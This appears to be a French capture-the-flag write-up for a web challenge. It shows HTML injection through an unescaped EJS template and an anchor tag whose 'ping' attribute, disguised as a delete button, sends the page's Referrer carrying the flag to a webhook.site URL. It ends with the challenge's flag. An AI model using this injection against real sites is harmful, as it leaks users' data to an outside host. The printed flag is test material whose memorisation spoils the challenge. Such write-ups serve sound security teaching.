# Solve

Dans ce challenge, on peut voir que le bot visite une page ou les joueurs peuvent rapporter des offres, on remarque aussi l'utilisation de la syntaxe suivante dans la page de report (report.ejs):

```html
<%- data.reason %>
```

On peut donc injecter n'importe quel HTML/JavaScript, mais cela ne sera pas possible à cause de la ligne suivante :

```js
await page.setJavaScriptEnabled(false); // On m'a toujours dit de ne jamais faire confiance aux utilisateurs
```

Heureusement, dans le tag `a`, il existe un attribut du nom de `ping` qui permet, lorsqu'on clique sur la balise en question, d'envoyer une requête POST avec plein d'informations, dont le `Referrer` (là ou notre flag est stocké).

Il faut donc réaliste une injection HTML pour faire un clickjacking et récupérer le flag :

```html
<a id="delete" name="delete" href="https://webhook.site/[UUID]" ping="https://webhook.site/[UUID]">click here</a>
```

# Flag

BZHCTF{d1d_u_p1ng_m3??}